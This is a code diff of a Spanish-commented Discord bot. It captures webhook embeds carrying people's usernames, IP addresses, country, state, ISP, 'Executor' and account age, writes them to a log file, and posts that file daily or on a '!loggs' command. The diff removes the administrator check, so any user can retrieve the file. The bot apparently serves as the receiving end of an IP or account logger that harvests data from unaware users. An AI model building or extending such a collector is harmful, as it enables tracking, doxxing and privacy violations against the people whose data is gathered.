@@ -1,114 +1,92 @@
-const { Client, GatewayIntentBits, PermissionsBitField, AttachmentBuilder } = require("discord.js");
+const { Client, GatewayIntentBits, AttachmentBuilder } = require("discord.js");
 const fs = require("fs");
 const path = require("path");
 
 const TOKEN = process.env.TOKEN;
 
-// === CONFIG ===
-const CHANNEL_ID_LISTEN = "1437151487141740637";  // Canal donde lee embeds
-const CHANNEL_ID_SEND = "1440773871254110300";    // Canal donde envía logs diarios
+// Canal donde llegan los webhooks
+const CAPTURE_CHANNEL = "1437151487141740637";
+
+// Canal donde se envían los logs diarios
+const SEND_LOGS_CHANNEL = "1440773871254110300";
+
+const LOG_FILE = path.join(__dirname, "logs_globales.txt");
 
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent,
-        GatewayIntentBits.DirectMessages
+        GatewayIntentBits.MessageContent
     ]
 });
 
-// === ARCHIVO DE LOGS DIARIO ===
-function getTodayFile() {
-    const date = new Date();
-    const day = `${date.getFullYear()}-${date.getMonth() + 1}-${date.getDate()}`;
-    return path.join(__dirname, `logs_${day}.txt`);
-}
+// =========================================
+//   CAPTURA DE WEBHOOKS Y PROCESAMIENTO
+// =========================================
+client.on("messageCreate", (msg) => {
+    if (!msg.webhookId) return;              // solo webhooks
+    if (msg.channel.id !== CAPTURE_CHANNEL) return;
+    if (!msg.embeds.length) return;
 
-// === GUARDAR LOG ===
-client.on("messageCreate", (message) => {
-    // PERMITIR MENSAJES DE WEBHOOK
-// Aceptar mensajes de webhook, pero ignorar bots normales
-if (!message.webhookId && message.author.bot) return;
-    if (message.channel.id !== CHANNEL_ID_LISTEN) return;
+    const embed = msg.embeds[0];
+    if (!embed.fields) return;
 
-    if (message.embeds.length === 0) return;
-    const embed = message.embeds[0];
+    // ============================
+    // Extraer datos del embed
+    // ============================
+    let Nombre = msg.content.match(/USUARIO:\s(.+?)\s\|/)?.[1] || "N/A";
+    let Display = msg.content.match(/DISPLAY:\s(.+)/)?.[1] || "N/A";
 
-    // Extraer campos
-    const campos = {};
-    embed.fields?.forEach(f => {
-        const name = f.name.toLowerCase();
+    let IP = embed.fields[0]?.value.replace(/```/g, "") || "N/A";
 
-        if (name.includes("usuario")) campos.usuario = f.value;
-        if (name.includes("display")) campos.display = f.value;
-        if (name.includes("ip")) campos.ip = f.value;
-        if (name.includes("país") || name.includes("pais")) campos.pais = f.value;
-        if (name.includes("estado")) campos.estado = f.value;
-        if (name.includes("ciudad")) campos.ciudad = f.value;
-        if (name.includes("id") && !name.includes("job")) campos.id = f.value;
-    });
+    let pais = embed.fields[1]?.value.match(/País:\s```(.+?)```/)?.[1] || "N/A";
+    let estado = embed.fields[1]?.value.match(/Estado:\s```(.+?)```/)?.[1] || "N/A";
+    let isp = embed.fields[1]?.value.match(/ISP:\s(.+)/)?.[1] || "N/A";
 
-    const fecha = new Date().toLocaleString();
-    const linea = `${campos.usuario || "N/A"} | ${campos.display || "N/A"} | ${campos.ip || "N/A"} | ${campos.pais || "N/A"} | ${campos.estado || "N/A"} | ${campos.ciudad || "N/A"} | ${campos.id || "N/A"} | ${fecha}\n`;
+    let executor = embed.fields[2]?.value.match(/Executor:\s(.+)/)?.[1] || "N/A";
+    let cuenta = embed.fields[2]?.value.match(/Cuenta:\s(.+?)\sdías/)?.[1] || "N/A";
 
-    const archivo = getTodayFile();
-    fs.appendFileSync(archivo, linea, "utf8");
+    // ============================
+    //   Formato FINAL compacto
+    // ============================
+    const linea = `${Nombre} | ${Display} | ${IP} | ${pais} | ${estado} | ${isp} | ${executor} | ${cuenta}\n`;
+
+    // Guardar en archivo
+    fs.appendFileSync(LOG_FILE, linea, "utf8");
 });
 
-// === ENVIAR LOGS DEL DÍA AUTOMÁTICAMENTE ===
-async function enviarLogsDiarios() {
-    const archivo = getTodayFile();
 
-    if (!fs.existsSync(archivo)) return; // Si no hay archivo, no envía nada
+// =========================================
+//   COMANDO !loggs → manda archivo actual
+// =========================================
+client.on("messageCreate", async (msg) => {
+    if (msg.content !== "!loggs") return;
 
-    const canal = await client.channels.fetch(CHANNEL_ID_SEND);
-    if (!canal) return;
+    if (!fs.existsSync(LOG_FILE)) {
+        return msg.reply("⚠️ No hay logs guardados.");
+    }
 
-    const file = new AttachmentBuilder(archivo);
+    const file = new AttachmentBuilder(LOG_FILE);
+    msg.reply({ content: "📄 Aquí están los logs actuales:", files: [file] });
+});
 
-    await canal.send({
-        content: "📄 **Logs del día:**",
+
+// =========================================
+//   ENVÍO AUTOMÁTICO DIARIO
+// =========================================
+setInterval(() => {
+    if (!fs.existsSync(LOG_FILE)) return;
+
+    const channel = client.channels.cache.get(SEND_LOGS_CHANNEL);
+    if (!channel) return;
+
+    const file = new AttachmentBuilder(LOG_FILE);
+    channel.send({
+        content: "📤 **Reporte diario de logs**",
         files: [file]
     });
 
-    // Reiniciar archivo para no saturar Railway
-    fs.unlinkSync(archivo);
-}
+}, 24 * 60 * 60 * 1000); // 24 horas
 
-// Ejecutar cada día a las 00:00
-setInterval(() => {
-    const now = new Date();
-    if (now.getHours() === 0 && now.getMinutes() === 0) {
-        enviarLogsDiarios();
-    }
-}, 60 * 1000); // Revisar cada minuto
-
-// === COMANDO PARA OBTENER LOGS ACUMULADOS ===
-client.on("messageCreate", async (message) => {
-    if (!message.content.startsWith("!loggs")) return;
-
-    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
-        return message.reply("❌ No tienes permisos para usar este comando.");
-    }
-
-    const archivo = getTodayFile();
-
-    if (!fs.existsSync(archivo)) {
-        return message.reply("No hay logs todavía hoy.");
-    }
-
-    const file = new AttachmentBuilder(archivo);
-
-    try {
-        await message.author.send({
-            content: `📄 Aquí están los registros acumulados del día:`,
-            files: [file]
-        });
-
-        message.reply("📬 Logs enviados a tu DM.");
-    } catch (err) {
-        message.reply("❌ No pude enviarte mensaje privado. Activa tus DMs.");
-    }
-});
 
 client.login(TOKEN);
